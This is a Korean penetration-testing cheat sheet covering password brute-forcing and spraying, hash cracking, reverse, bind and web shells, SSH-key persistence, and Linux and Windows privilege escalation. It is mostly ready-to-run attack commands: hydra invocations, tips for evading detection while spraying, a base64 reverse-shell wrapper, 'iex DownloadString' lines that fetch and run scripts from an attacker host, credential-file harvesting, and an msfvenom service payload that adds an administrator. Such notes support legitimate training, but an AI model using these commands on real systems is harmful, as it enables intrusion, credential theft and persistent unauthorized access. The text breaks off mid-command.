보안 제어 및 솔루션들이 발전한 현대에 들어서는 거의 사용되지 않는 공격 기법

### 3.1.2. 사전 공격 (Dictionary Attack)

- 사전 파일

https://github.com/danielmiessler/SecLists

**`/usr/share/wordlists/rockyou.txt`**

⇒ 고객사가 서울에서 음식과 관련된 업계에 있다면, Seoul, SK, KOR, SouthKorea, Food 등의 단어 추가하기

- **hydra**

`hydra -L <유저파일> -P <비밀번호파일> ftp://<IP주소> -V -s <포트번호>`

`hydra -l <유저이름> -P <비밀번호파일> ssh://<IP주소> -V -s <포트번호> -f` : 유저 이름 지정하여 시

`hydra -L <유저이름파일> -P <비밀번호파일> <IP주소> -s <포트번호> http-post-form "/<url>:<유저이름-파라미터>=^USER^&<비밀번호-파라미터>=^PASS^:F=<실패시-나오는-에러메시지-일부>" -V` : HTTP 공격

- **워드프레스 사전 공격**

`wpscan --url http://<IP주소>:<포트번호> --passwords <비밀번호파일>`

### (참고) wordlist 만드는 도구

https://security.packt.com/4-tools-to-create-your-own-custom-wordlist/, https://www.bordergate.co.uk/custom-wordlists/

- **crunch  (**https://www.kali.org/tools/crunch/)

`crunch <최소> <최대> <문자 집합> -t <패턴> -o <경로>`

| **명령어** | **설명** |
| --- | --- |
| `crunch 6 6 -t @%%%%% -o wordlist.txt` | 알파벳 소문자 1개 뒤에 숫자 5개 |
| `crunch 6 8 -o wordlist.txt` | 6~8자로 구성된 단어 목록 생성 |
| `crunch 4 6 -a lsd -o wordlist.txt` | 소문자, 숫자, 특수문자를 포함하는 단어 목록 생성 |
| `crunch 12 12 -o wordlists.txt` | 특정 길이의 단어 목록을 생성 |
| `crunch 4 6 -a 0123456789abc -o wordlist.txt` | 사용자 정의 문자 집합을 사용하여 단어 목록 생성 |
- **cewl  (**https://www.kali.org/tools/cewl/)

웹사이트에서 단어를 수집하여 사전파일을 만들어주는 도구

`cewl <url> -d <깊이> -m <최소 길이> -w <경로>`

- **cupp  (**https://github.com/Mebus/cupp)

이름, 생년월일, 별명 등의 정보를 가지고 사전파일을 만들어주는 도구

### 3.1.3. 비밀번호 스프레이 공격 (Password Spraying Attack)

정보 수집 과정을 통해 얻은 다양한 유저 이름을 기반으로, 가장 흔하게 사용될 것으로 예상되는 비밀번호를 선택

- **hydra**

`hydra -L <유저이름파일> -p 'password' ssh://<IP주소> -s <포트번호> -V`

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

실제 공격자들은 각 비밀번호 스프레잉의 간격을 8시간에서 24시간 정도로 잡는다.

공격 탐지를 회피하기 위해 다음과 같은 비밀번호 스프레잉 공격을 진행할 수 있다.

1. Source IP 주소를 매 로그인 마다 바꿈
2. 각 유저 로그인 시도마다 랜덤한 딜레이 적용
3. 모든 유저가 아닌 10~20명의 유저들씩 쪼개서 비밀번호 스프레잉 공격 진행
</aside>

### 3.1.4. 크레덴셜 스터핑 공격 (Credential Stuffing Attack)

OSINT나 다크웹 등에서 유출된 계정정보 찾기

### 3.1.5. 디폴트/기본 계정 정보 확인 (Default Credentials/Passwords)

웹 서버나 웹 애플리케이션의 이름 및 버전정보를 확인한 뒤, 구글링 등의 검색을 통해 기본 계정이 존재하는지, 만약 존재한다면 사용자 이름과 비밀번호가 뭔지 서칭하기

## 3.2. MySQL, 데이터베이스 덤핑, 해시크래킹

### 3.2.1. 원격 데이터베이스 덤핑

`mysqldump -h <IP주소> -P <포트번호> -u <유저이름> -p'<비밀번호>' <DB이름> > <출력-파일이름>.sql` 

`mysqldump -h <IP주소> -P <포트번호> -u <유저이름> -p'<비밀번호>' <DB이름> <테이블이름> --where="username LIKE '%admin%'"`

### 3.2.2. 해시 크래킹 (Hash Cracking)

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

해시(Hash)는 임의의 데이터를 고정된 길이의 출력값으로 단방향 변환한 값

- 해시로 원래의 평문을 알아내는 것은 수학적으로 불가능 하나, 오래된 해시 알고리즘의 경우 암호학적인 취약점이 발견돼 가능한 경우도 있다.
- 해시 ≠ 암호화. 복호화 X. 기밀성 X.

해시 크래킹(Hash Cracking)은 암호학적인 취약점을 이용한다기 보다는 브루트포스 공격을 이용해 동일한 해시값이 나올 때 까지 수많은 평문 문자열들을 해시화 하는 형식으로 크래킹을 진행한다.

- Rainbow Table : 모든 문자열을 조합해 해시값을 구한 뒤, 이를 데이터베이스화 한 것
</aside>

`hash-identifier <hash>` : 해시화된 데이터가 있다면 어떤 종류의 함수 알고리즘인지 확인

`john --format=<알고리즘> --wordlist=<사전파일> <파일이름> --pot=<출력-파일이름>`

- 그 외에도 `johntheripper` 나 `hashcat` 등의 툴을 이용하여 크래킹 공격을 할 수도 있다.
- hashcat -m 옵션 : https://hashcat.net/wiki/doku.php?id=example_hashes

## 3.3. 쉘

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

쉘 종류

1. 바인드 쉘(Bind Shell) : 대상 호스트의 특정 포트에서 공격자의 접속 요청을 기다리는 쉘 유형
    - 만들기 쉽고 실행하기 쉽다는 장점도 있지만, 단점이 많아 실무에서는 잘 사용 X
    - 바인드 쉘이 특정 포트에 묶인다고 하더라도, 인바운드 방화벽으로 접근 불가능한 경우가 다수
2. 리버스 쉘(Reverse Shell) : 대상 호스트에서 공격자 호스트의 특정 포트로 먼저 연결을 시도한 뒤 세션을 구축하고, 공격자에게 접근 권한을 제공하는 쉘의 유형
    - 아웃바운드 방화벽은 널널한 편이라 방화벽 규칙에 의해 막힐 가능성은 낮음
3. 웹 쉘(Web Shell) : 공격자가 웹 서버에 업로드하고 웹 브라우저를 통해 원격으로 명령을 실행할 수 있게 하는 페이로드의 유형
4. 위치 독립 코드(PIC: Position Independent Code): 메모리상 어느 지점에서나 운영체제의 로더(Loader)의 도움 없이 맵핑 및 실행 가능한 코드
5. 쉘코드(Shellcode): 어셈블리어로 표현된 기계어 기반의 쉘을 실행하는 코드
6. C2 에이전트(Command and Control Agent): C2 프레임워크로 콜백 하는 에이전트
</aside>

### 3.3.1. 웹 쉘

https://github.com/mIcHyAmRaNe/wso-webshell

### 3.3.2. 바인드 쉘

- **msfvenom**

`msfvenom -p linux/x64/shell_bind_tcp RHOST=<타겟IP> LPORT=<포트번호> -f <포맷> -o <출력-파일이름>`

- **명령어를 통한 바인드 쉘**

명령어 기반 바인드 쉘을 이용할 때에는 대상 호스트에 본인이 사용하고자 하는 명령어가 있는지부터 정보 수집을 통해 알아낸 뒤, 사용하면 좋다.

https://www.revshells.com/

### 3.3.3. 리버스 쉘

- msfvenom

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<tun0 IP> LPORT=<포트번호> -f <포맷> -o <출력-파일이름>`

- **명령어를 통한 리버스 쉘**

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://www.revshells.com/

- **웹쉘 업로드 후 리버스 쉘**

revershell payload 내 `&` 등 입력 시 페이로드가 제대로 전달되지 않아 base64로 인코딩하여 보내는 게 좋다.

```python
import base64
command = rb"""<reverse_shell_payload>"""
command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
print(command)
```

또는 `echo "<base64 encoding 된 페이로드>" | base64 -d | bash`

### 3.3.4. 리버스 쉘 업그레이드

(리버스 쉘) `python3 -c 'import pty; pty.spawn("/bin/bash");'`

- python 이 없을 경우 : `script /dev/null -c bash`

(리버스 쉘) (ctrl + z)

(칼리) `stty raw -echo; fg`

(칼리) `reset`

(리버스 쉘) `export SHELL=bash`

(리버스 쉘) `export TERM=xterm-256color`

<aside>
💡

아니면 `rlwrap nc -lvnp 4444` 로 reverse shell을 받으면 된다.

</aside>

## 3.4. 공개 익스플로잇 사용

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

공개 익스플로잇은 보안 연구자들에 의해 만들어진, 이미 알려진 취약점을 대상으로 하는 개념증명(Proofof-Concept) 익스플로잇이다.

1. 대상 시스템 정보 수집
2. 취약점 정보 수집
3. 공개 익스플로잇 검색
4. 공개 익스플로잇 분석
5. 페이로드 준비
6. 익스플로잇 수정 및 실행
</aside>

### 3.4.1. 대상 시스템 정보 수집

정보 수집 단계에서 알아낸 시스템의 이름 및 역할, 버전 정보를 토대로 출시됐던 년도, 취약점 목록을 찾아야 한다.  이때 가장 확실한 방법은 시스템을 만든 벤더의 공식 홈페이지나 위키피디아 등에서 확인하는 것이다.

구글검색: `"시스템 이름" "버전" "vulnerabilities" "exploits"` 등

https://www.cve.org/

https://cve.mitre.org/

### 3.4.2. 취약점 정보 수집

CVE 웹사이트들 뿐만 아니라 레퍼런스 링크를 살펴보며 최초 취약점 발견자가 어떤 정보를 제공하는지 알아내야 한다. 해당 취약점이 어디서 발견된 어떤 종류의 취약점인지, 어떤 영향을 미치는지 정도의 정부를 추가 수집한다.

### 3.4.3. 공개 익스플로잇 검색

CVE 웹사이트들은 취약점과 관련된 레퍼런스 링크를 같이 걸어놓는데, 이 레퍼런스 링크들은 대부분 취약점이 발견됐을 때 보안연구자 개인이나 회사들이 익스플로잇 코드와 함께 취약점을 발표하는 글인 경우가 많다.

`searchsploit <서비스이름> <버전>`

구글검색: `<CVE> exploit site:github.com` ,  `<CVE> exploit site:exploit-db.com` 

### 3.4.4. 공개 익스플로잇 분석

구글검색: `<CVE> "analysis" github`

먼저 구한 익스플로잇이 어떤 종류인지 파악한다. 스택/힙 관련 오버플로우 익스플로잇이나 DoS를 일으키는 익스플로잇은 사용을 지양해야 한다. 그 후에 익스플로잇에 달려있는 주석과 설명을 읽고, 익스플로잇 트리거 놀리를 확인하는 등 익스플로잇 코드를 분석한다.

### 3.4.5. 페이로드 준비 및 익스플로잇 실행

## (참고) 윈도우 접근 방법

- **RDP**

RDP를 통해 접근하기 위해선 로그인 계정이 로컬 관리자 계정은 아니여도 되지만, Remote Desktop Users 라는 그룹에 속해있어야 한다.

`xfreerdp /u:<유저이름> /p:'<비밀번호>' /v:<IP주소> /dynamic-resolution`

- **winrm**

WinRM을 통해 접근하기 위해선 로그인 계정이 로컬 관리자 계정이거나, Remote Management User 라는 그룹에 속해있어야 한다.

`evil-winrm -i <IP주소> -u <유저이름> -p '<비밀번호>'`

- **SMB**

psexec를 사용하기 위해선 로그인 계정이 로컬 관리자 계정이여야 한다.

`impacket-psexec <유저이름> '<비밀번호>'@<IP주소>`

- **WMI**

wmiexec를 사용하기 위해선 로그인 계정이 로컬 관리자 계정이여야 한다.

`impacket-wmiexec <유저이름> '<비밀번호>'@<IP주소>`

## (참고) persistence - SSH key

```bash
$ ssh-keygen -t rsa -b 2048 -f mykey

<user-name>@<IP>:~$ mkdir -p ~/.ssh
<user-name>@<IP>:~$ echo 'ssh-rsa AAAAB3...내_공개키_내용... <user-name>@attacker' >> ~/.ssh/authorized_keys
<user-name>@<IP>:~$ chmod 700 ~/.ssh
<user-name>@<IP>:~$ chmod 600 ~/.ssh/authorized_keys

$ ssh -i mykey <user-name>@<IP>
user-name@IP:~$ 
```

# 4. 후속 공격 (리눅스)

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

1. 정보 수집 (Information Gathering): 내부망 이동(Laternal Movement)을 위해 필요한 계정 정보 등을 확보하기 위한 단계
2. 권한 상승 (Priviledge Escalation): 루트 또는 로컬 관리자 권한을 획득하여 시스템을 완전히 통제하고, 계정 정보, 데이터, 서비스 등을 탐색
3. 네트워크 피벗 (Network Pivoting): 내부망 이동과 망 분리된 영역에 접근하기 위한 기술로, 네트워크 피벗을 활용하여 내부 네트워크에서의 이동과 망 분리된 영역으로의 접근 시도
</aside>

## 4.1. 정보수집

### 4.1.1. 호스트 정보 수집

`hostname` : 호스트 이름

`cat /etc/os-release` : 호스트 버전 정보

`uname -a` : 호스트 시스템 정보

### 4.1.2. 유저 정보 수집

`whoami` : 유저 확인

`id` : 현재 유저 UID, GID 식별자 확인

`sudo -l` : 현 유저의 sudo 권한 정보

- **다른 유저 및 그룹 확인**

`cat /etc/passwd` : 호스트 내 모든 유저 확인 (uid가 1000 이상인건 실제 사람이 사용하는 계정

- **vagrant**는 데브옵스 기술로서, 가상 머신이나 컨테이너를 만들 때 자주 사용
- 기본 계정이 vagrant:vagrant 이다. /etc/passwd 에 “vagrant”가 존재한다면 로그인 시도
- 서비스 유저는 비밀번호를 “password” 나 계정 이름으로 세팅하는 경우가 많다.

`cat /etc/group` : 호스트 내 모든 로컬 그룹 확인

`getent group <그룹이름>` : 다른 그룹에 속한 유저 확인

`groups <유저이름>` : 특정 유저의 그룹 확인

### 4.1.3. 홈 디렉토리, SSH 키, 닷 파일, 닷 디렉터리 (dot) 정보 수집

`ls -lah /home/<유저이름>` : 유저의 홈 디렉터리 확인 ⇒ .ssh key 있는지 확인

### 4.1.4. 네트워크 정보 수집

`arp -a` : 호스트 내 ARP 테이블 확인 (Layer 2)

`ifconfig` : 호스트 네트워크 인터페이스 및 IP 주소 확인 (Layer 3)

`route -n` : 라우팅 테이블 확인

`netstat -ano` : 호스트에서 들어오고 나가는 트래픽 확인

### 4.1.5. 프로세스 정보 수집

`ps faux` : 어떤 프로세스들이 실행중인지

### 4.1.6. 서비스 정보 수집

`systemctl --type=service --state=running` : 어떤 서비스들이 실행중인지

### 4.1.7. 포트 및 세션 정보 확인

`ss -ltnp` : 열린 포트

`netstat -tulpna` : 열린 세션

### 4.1.8. 설치된 소프트웨어 확인

`dpkg --list` : Debian/Ubuntu 기반 시스템 DPKG 패키지 소프트웨어 확인

`ls -alh /opt` : 시스템 패키지 관리자를 통하지 않고 직접 설치한 소프트웨어 확인

### 4.1.9. 시스템 파일 확인 및 권한 확인

`find /etc -name "*.conf" 2>/dev/null` : 설정 파일 확인

`find /var/log -name "*.log" 2>/dev/null` : 로그 파일 확인

`find / -type f -perm 0777 2>/dev/null` : 777 파일 확인

`find / -type f -perm -4000 2>/dev/null` : SUID 세팅된 파일 확인

### 4.1.10. 쉘 / 변수 확인

secret key 등 민감한 정보가 노출되어있진 않은지 확인해야 한다.

`echo $SHELL` : 현재 사용 중인 쉘 확인

`echo $PATH` : 시스템의 PATH 환경 변수 확인

`env` : 현재 환경 변수 확인

`export` : 환경 변수 설정 및 확인

### 4.1.11. 컨테이너 / 도커 / 쿠버네티스 환경 확인

`cat /proc/self/cgroup` : 도커 컨테이너나 쿠버네티스 파드에서 실행 중인 프로세스는 특정 cgroup에 속하게 되고, 이 cgroup 정보는 /proc/self/cgroup 파일에 표시된다.

ex) Docker 컨테이너 ⇒ 해당 cgroup 경로에는 “docker” 라는 문자열이 포함되어 있음

`ls -alh /.dockerenv` : Docker 컨테이너에서 실행 중이라면, / 디렉토리에 .dockerenv 파일이 존재

### 4.1.12. 정보 수집 자동화 스크립트 - LinPEAS

LinPEAS는 시스템에서 권한 상승 및 보안 취약점을 찾기 위해 사용되는 스크립트 중 하나

https://github.com/peass-ng/PEASS-ng/releases/download/20250301-c97fb02a/linpeas.sh

## 4.2. 권한상승

### 4.2.1. 하드코딩된 계정 정보

하드코딩된 게정 정보는 주로 소스 코드, 설정 파일(/etc/*.conf), 특정 소프트웨어 설정 파일(ex. 웹서버), 환경 변수등에 저장되어 있을 수 있다.

`grep -ri password /etc/*.conf` : 설정 파일에 하드코딩된 패스워드가 있는지 확인

`cd /var/www/html` & `cat config.php` : 웹서버와 관련된 파일에서 하드코딩된 정보가 있는지 확인

`grep -Eroh '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' ./ | sort -u | grep -v example | grep -v gmail` : 어플리케이션의 소스코드를 확보했다면 이메일 검색

### 4.2.2. 소프트웨어 취약점

리눅스 호스트에 설치된 소프트웨어 취약점 여부에 대해 알아보고 해당 취약점을 통해 권한 상승을 시도할 수 있다. 

`dpkg --list` 를 통해서도 확인할 수 있지만 너무 많기 때문에 `/opt` 디렉터리를 살펴보는 게 좋다. 설치된 소프트웨어 버전에 존재하는 취약점이 있는지 exploit-db, searchsploit 등을 통해서 찾을 수 있다.

### 4.2.3. SUID

SUID : Unix 및 Unix 계열 운영체제에서 사용자 권한을 일시적으로 상승시키는 데 사용되는 보안 기능 중 하나로, SUID가 설정된 실행 파일은 해당 파일을 실행하는 동안 파일의 소유자 권한으로 실행된다.

`find / -type f -perm -4000 2>/dev/null` : SUID 바이너리 찾기

https://gtfobins.github.io/ : 시스템 환경에서 사용 가능한 도구나 명령어를 악용하여 권한 상승 및 시스템 액세스 방법 제공

### 4.2.4. sudo 권한

sudo : 특정 유저에게 다른 유저 혹은 루트 유저의 권한을 일시적으로 부여하여 특정 명령어를 실행할 수 있게 해주는 명령어

`sudo -l` : 현재 사용자가 어떤 명령어를 sudo 로 실행할 수 있는지 확인. NOPASSWD 와 ALL 옵션이 설정되어 있으면 현재 사용자의 비밀번호를 입력하지 않고도 sudo를 사용할 수 있음.

- **`env_keep+="ENV BASH_ENV"`**
    
    ```bash
    hish@environment:~$ sudo -l
    Matching Defaults entries for hish on environment:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, **env_keep+="ENV BASH_ENV"**, use_pty
    
    User hish may run the following commands on environment:
        (ALL) /usr/bin/systeminfo
    ```
    
    ```bash
    hish@environment:~$ echo "/bin/bash" > /tmp/myscript
    hish@environment:~$ chmod +x /tmp/myscript
    hish@environment:~$ export BASH_ENV=/tmp/myscript
    hish@environment:~$ sudo /usr/bin/systeminfo
    
    root@environment:/home/hish# id
    uid=0(root) gid=0(root) groups=0(root)
    ```
    

### 4.2.5. cron (작업 스케줄러)

크론(cron) : 특정 시간이나 요일에 자동으로 실행되는 작업을 예약하는 데 사용되는 시스템으로, **/etc/cron.d/** 및 **/etc/cron.*** 디렉토리에 위치한 파일들을 통해 관리된다.

`crontab -l` : 사용자가 설정한 크론 작업 확인

`ls -alhR /etc/cron*` : 시스템 전반적인 크론 확인

`cat /etc/crontab`

⇒ 루트 권한으로 실행되는 cron 작업이 있는지 확인 후 해당 바이너리를 덮어씌워 악용할 수 있는 지 확인

### 4.2.6. SSH Private Key 권한

`cat /home/<타겟 유저>/.ssh/id_rsa` : 타 사용자의 SSH 개인키를 획득 (개인키에 id_rsa 말고도 **id_ed25519**도 있다)

`ssh -i <획득한 키 파일> user@target-system` : 원격 시스템에 접속 시도

- **passphrase가 존재할 때**

`ssh2john [id_rsa파일] > [id_rsa파일].john` : ssh 개인 키를 JohntheRipper 에서 사용할 수 있는 형식으로 변환
`john --wordlist=/usr/share/wordlists/rockyou.txt [id_rsa파일].john` : passphrase 크랙

### 4.2.7. 히스토리 파일 이용

`cat /home/<타겟 유저>/.bash_history` : 히스토리 파일을 확인하여 민감한 정보 스캔

### 4.2.8. 777 권한

`find / -type f -perm 0777 2>/dev/null`

- **passwd 및 shadow의 777 권한을 악용한 비밀번호 해시 크랙킹**

`unshadow passwd shadow > combined.txt | john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt`

### 4.2.9. 환경 변수

`env | grep -E '=.+' | grep -i aws` : 환경변수에 노출된 aws access key 등 민감 정보가 있는지 확인

# 5. 후속 공격 - 윈도우

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

**유저 레벨**

- 로컬 낮은 권한 계정 : 특정 호스트 안에서만 존재하는 일반적인 로컬 유저 계정
- 도메인 낮은 권한 계정 : 일반적인 도메인 유저 계정 (AD환경)
- 서비스 계정 : 윈도우 서비스를 실행하기 위해 사용되는 특별한 계정 - NetworkService, LocalSystem
- 로컬 관리자 계정 - Administrator
- SYSTEM 계정 : 윈도우 OS, 서비스, 프로세스 들이 사용하는 높은 권한 (사용자 계정 X)

⇒ 윈도우 후속 공격은 로컬 관리자 권한을 획득하여 다양한 자격 증명을 덤핑하는 것이 주 목적이다!

**다양한 자격 증명 덤핑**

- SAM 데이터베이스 : 로컬 유저 계쩡 정보
- LSA secrets : 레지스트리 내 서비스 계정, IE, SQL, Cisco, 와이파이 등의 계정 정보
- LSASS : 호스트내 interactive logon 세션을 구축한 유저들의 캐시된 계정 정보 (메모리 안에 저장되어 메모리 덤프를 해야함)
- DPAPI : 호스트 내 유저 키 혹은 마스터 키로 암호화된 다양한 계정 정보 (ex. 크롬 자동 로그인)
</aside>

## 5.1. 정보 수집

### 5.1.1. 호스트 기본 정보 수집

`hostname` : 호스트 이름

`systeminfo` : 호스트 버전 정보

`winver.exe` : Windows 버전 Detailed

`dir env:` : 환경변수

### 5.1.2. 유저 정보 수집

`whoami` : 유저 확인

`whoami /priv` : 유저 권한 확인

`net user redraccoon` : 현재 유저의 그룹 확인

- **다른 유저 및 그룹 확인**

`net user` : 호스트 내 모든 유저 확인

`cd C:\Users` : User 디렉터리에 접근하여 현존하는 모든 유저 이름 확인

`net localgroup` : 호스트 내 모든 로컬 그룹 확인

`net localgroup Administrators` : 로컬 관리자 그룹에 속한 유저 확인

`net localgroup <그룹명>` : 다른 그룹에 속한 유저 확인

`net user <유저이름>` : 특정 유저의 그룹 확인

### 5.1.3. 네트워크 정보 수집

`arp -A` : 호스트 내 ARP 테이블 확인 (Layer 2)

`ipconfig /all` : 호스트의 네트워크 인터페이스 카드 모두 확인 (Layer 3)

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

현 호스트에 NIC가 몇 개 달려있는 지 중요함!

ex) NIC가 2개 이상이라면? ⇒ 해당 호스트는 jump host일 가능성이 높음

</aside>

`route PRINT` : 라우팅 테이블 확인

`netstat -ano` : 호스트에서 들어오고 나가는 트래픽 확인

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

로컬호스트(127.0.0.1)에서만 열려있는 포트의 경우 특정 네트워크 서비스들의 관리자 서비스/애플리케이션이 실행중일 가능성이 높음

</aside>

### 5.1.4. 프로세스 정보 수집

`ps` : 실행중인 프로세스 확인

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

- SI가 0인 건 시스템에서 실행하고 있는 프로세스 이고, SI가 1 이상인 건 사용자가 실행하고 있는 프로세스
- AV/EDR 솔루션들의 유저랜드 프로세스 이름을 확인해서, 프로세스가 돌고 있다면 우회 페이로드 제작 필요
</aside>

### 5.1.5. 서비스 정보 수집

`wmic service list brief`

`Get-Service`

`Get-Service | Where-Object { $_.Status -eq 'Running' }` : 실행중인 서비스만 확인

`sc.exe query <서비스명>` : 특정 서비스 확인

`Get-Service -Name <서비스명>` : 특정 서비스 확인

`cd C:\` || `cd 'C:\Program Files\'` : 어떤 소프트웨어가 깔려있는지 확인

 Evil-WinRM의 `services` 명령어를 사용

### 5.1.6. 정보 수집 자동화 스크립트 - WinPEAS

https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1

`iex(new-object Net.WebClient).DownloadString('http://<칼리IP>:80/winPEAS.ps1') >
~/Desktop/winpeas-output.txt` : 대상 호스트에서 파워쉘 다운 + 메모리 삽입 + 실행

### 5.1.7. 정보 수집 자동화 스크립트 - PowerUp.ps1

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

`iex(new-object Net.WebClient).DownloadString('http://<칼리IP>:80/PowerUp.ps1')` : 대상 호스트에서 파워쉘 다운 + 메모리 삽입

`Invoke-AllChecks` :  PowerUp.ps1의 함수인 Invoke-AllChecks 실행

### 5.1.8. 자격 증명 탐색

1. LSASS 덤프 (mimikatz, procdump, comsvcs.dll → Sekurlsa)
2. cmdkey /list or VaultCreds
3. Unattended / Scheduled Task / Service 계정 비번
4. SAM + SYSTEM 해시 덤프
5. DPAPI / Credential Manager / Browser 저장 데이터 ← 여기서 기회가 생김
6. LAPS, gMSA, ADCS 환경 관련 키 탐색

| 위치 | 내용 | 메모 |
| --- | --- | --- |
| `cmdkey /list` | 저장된 자격증명 | 이미 확인했으므로 없음 |
| `C:\Users\<user>\AppData\Roaming\Microsoft\Credentials` | Windows Credential Manager 저장 정보 | DPAPI로 암호화, 해당 사용자 계정에서만 복호화 가능 |
| `C:\Users\<user>\AppData\Local\Microsoft\Vault` | Vault Credential 저장소 | Windows 8 이후, DPAPI 사용 |
| `C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Protect` | DPAPI 마스터 키 저장 | SYSTEM 또는 해당 사용자 권한 필요 |

## 5.2. 권한 상승

### 5.2.1. 하드코딩 된 비밀

- **서버**

네트워크 서비스들의 설정 파일

`C:\*` || `C:\Program Files\*` || `C:\Program Files(x86)*`

`Get-ChildItem -Path C:\CouchDB\ -Recurse -Include *.ini,*.xml,*.config -ErrorAction SilentlyContinue | Select-String -Pattern "passw" -CaseSensitive:$false | Group-Object Path | ForEach-Object { $_.Name }` : 설정 파일에 자주 쓰이는 확장자를 가진 파일 찾기

- **일반 유저들의 기기**

데스크탑 폴더, 다운로드 폴더 등

설정 파일보다는 .txt, .docx, .xlsx, .csv, .md 등의 마이크로소프트 문서나 텍스트, 마크다운 문서들을 자주 사용

`Get-ChildItem -Path c:\users\ -Recurse -Include *.ini,*.config,*.xml,*.txt,*.md,*.csv -ErrorAction SilentlyContinue | Select-String -Pattern 'passw|secret' -CaseSensitive:$false | Group-Object Path | ForEach-Object { "[+] Potential plaintext creds: $($_.Name)" }`

- **슈퍼 유저들의 기기**

개발자들의 소스 코드 경로, 시스템 관리자들의 "작업" 경로, 파워쉘 히스토리 파일, 데브옵스/클라우드 엔지니어의 홈 디렉토리 등

`(Get-PSReadLineOption).HistorySavePath` : 파워쉘 히스토리 파일 위치 확인

### 5.2.2. Unattended Files (Answer File)

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

Unattended File : 자동화된 호스트 프로비저닝, 윈도우 설치, 설치 직후 설정을 변경할 수 있는 규칙을 모아놓은 파일

1. 로컬 유저 생성 시 하드코딩된 유저 이름 및 비밀번호
2. 윈도우 설치 직후 실행되는 스크립트 및 CLI 프로그램에 계정 정보가 필요할 때
</aside>

Unattend 파일의 경로는 해당 파일을 사용하는 기술/솔루션들마다 다르다. 파일 이름 또한 unattend, unattended, sysprep 등으로 다르며, 파일 확장자 또한 .xml, .inf, .txt 등을 사용한다.

- **주로 사용되는 파일 경로**
    - C:\windows\panther\unattend.xml
    - C:\windows\panther\unattended.xml
    - C:\windows\panther\unattend\unattend.xml
    - C:\windows\panther\unattend\unattended.xml
    - C:\windows\system32\sysprep\sysprep.inf
    - C:\windows\system32\sysprep\sysprep.xml

`Get-ChildItem -Path c:\windows\panther -Recurse -Include 'sysprep.inf', 'sysprep.xml', 'unattend.xml', 'unattended.xml', 'unattend.txt' -Force | ForEach-Object { $_.FullName }`

### 5.2.3. Credential Manager

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

CM : 윈도우 운영체제에서 네트워크, 웹사이트, 애플리케이션 등의 로그인 정보와 계정 정보를 저장하고 관리하는 비밀번호 매니저 프로그램

- DPAPI라는 WinAPI를 이용해 유저의 키로 암호화
- 유저가 Cred Manager 안에 계정 정보를 저장해놨어야 악용 가능함

Cred Manager 안의 계정 정보를 이용해 권한 상승을 하는 방법

1. 이미 저장된 계정 정보를 이용해 새로운 프로세스를 생성
2. 이미 저장된 계정 정보를 DPAPI를 통해 복호화해 평문 비밀번호를 획득
    1. `mimikatz`, `dploot`, `DonPAPI` 등
</aside>

`cmdkey /list` : 현재 사용중인 유저 계정이 Cred Manager에 저장한 계정 정보가 있는지 확인

`RunAs /savecred /u:Administrator "powershell.exe”` : CM에 저장된 계정 정보를 사용해 특정 유저로 프로세스 실행

### 5.2.4. Unquoted Service Path (Unqouted 서비스 경로)

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

윈도우 서비스는 ImagePath 또는 BINARY_PATH_NAME 이라는 속성을 가지고 있어 서비스가 실행할 파일 경로를 저장하고 있다. 서비스 실행 시 실행할 파일 명이 큰 따옴표( " )로 둘러 쌓이지 않고 파일 경로에 공백이 포함될 경우 윈도우 운영체제가 특별한 순서로 파일을 탐색한다.

**[사전 조건]**

- 큰 따옴표로 둘러쌓이지 않고 경로 내에 공백이 존재하는 ImagePath 속성을 가진 윈도우 서비스가 존재해야 함.
- 현재 유저가 공백이 존재하는 서비스 경로에 포함된 디렉토리들 내에서 파일을 생성할 수 있는 쓰기 권한이 있어야 함.

**[공격 순서]**

1. Unquoted Service Path를 만족하는 ImagePath를 가진 서비스 확인
2. 페이로드 파일을 작성할 쓰기 권한 존재하는 지 확인
3. 해당 서비스를 재시작하거나 호스트를 재부팅할 수 있는지 확인
</aside>

Step 1) **Unquoted Service Path를 만족하는 ImagePath를 가진 서비스 확인**

`Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode` : ImagePath에 따옴표가 없으면서 띄어쓰기가 존재하는 서비스 출력

`wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """`

Step 2) **페이로드 파일을 작성할 쓰기 권한 존재하는 지 확인**

`icacls C:\opt\` : 디렉터리 권한 확인

 C:\SysinternalsSuite> `.\accesschk.exe -q -d <디렉터리경로> -accepteula`

Step 3) **페이로드 생성**

`msfvenom -p windows/x64/exec CMD="net localgroup administrators redraccoon /add" -f exe-service -o Abyss.exe`

Step 4) **해당 서비스를 재시작하거나 호스트를 재부팅할 수 있는 지 확인**

`try{ Restart-Service -Name "<서비스명>" -WhatIf ; echo "You DO have permission to
